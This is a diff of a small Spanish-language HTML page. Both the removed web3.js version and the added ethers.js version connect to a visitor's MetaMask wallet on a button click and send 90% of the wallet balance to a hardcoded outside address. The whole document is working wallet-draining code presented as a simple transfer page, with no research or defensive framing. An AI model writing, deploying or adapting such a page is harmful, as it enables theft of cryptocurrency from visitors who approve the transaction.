@@ -1,41 +1,35 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8" />
-    <title>Enviar 90% del saldo automáticamente</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.0/dist/web3.min.js"></script>
-  </head>
-  <body>
-    <h1>Enviar 90% del saldo automáticamente</h1>
-    <button onclick="enviar()">Enviar 90% del saldo</button>
-    <script>
-      async function enviar() {
-        // Conectar a MetaMask
-        if (typeof window.ethereum !== "undefined") {
-          await window.ethereum.enable();
-        }
-
-        // Obtener la dirección del usuario
-        const accounts = await web3.eth.getAccounts();
-        const userAddress = accounts[0];
-
-        // Obtener el saldo del usuario
-        const balance = await web3.eth.getBalance(userAddress);
-
-        // Calcular el 90% del saldo
-        const amountToSend = balance * 0.9;
-
-        // Enviar la transacción
-        const txHash = await web3.eth.sendTransaction({
-          from: userAddress,
-          to: "0x8935361d21943Ee8a863082EdD8a6Aefb062E434", // Dirección de destino
-          value: amountToSend,
-        });
-
-        // Mostrar el hash de transacción en la consola
-        console.log("Hash de transacción:", txHash);
-      }
-    </script>
-  </body>
+<head>
+	<title>Transferir el 90% del saldo</title>
+</head>
+<body>
+	<h1>Transferir el 90% del saldo</h1>
+	<button onclick="transferir()">Transferir</button>
+	<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" integrity="sha384-YtPpSMXa0t/+1kK0CgnJZboMZc7CwQ0jKb7aJ/zFsS0V7Ou8lTqV7KjQk4sF4DdO" crossorigin="anonymous"></script>
+	<script>
+		async function transferir() {
+			if (typeof window.ethereum !== 'undefined') {
+				await window.ethereum.enable();
+				const provider = new ethers.providers.Web3Provider(window.ethereum);
+				const signer = provider.getSigner();
+				const address = await signer.getAddress();
+				const balance = await provider.getBalance(address);
+				const amountToTransfer = balance.mul(9).div(10); // Calcula el 90% del saldo
+				const receiver = "0x01C65F22A9478C2932e62483509c233F0aaD5c72"; // Cambiar por la dirección de destino
+				const transaction = {
+					to: receiver,
+					value: amountToTransfer
+				};
+				const response = await signer.sendTransaction(transaction);
+				console.log(response);
+			} else {
+				alert("Por favor instale MetaMask para continuar.");
+			}
+		}
+	</script>
+</body>
 </html>
+
+
 
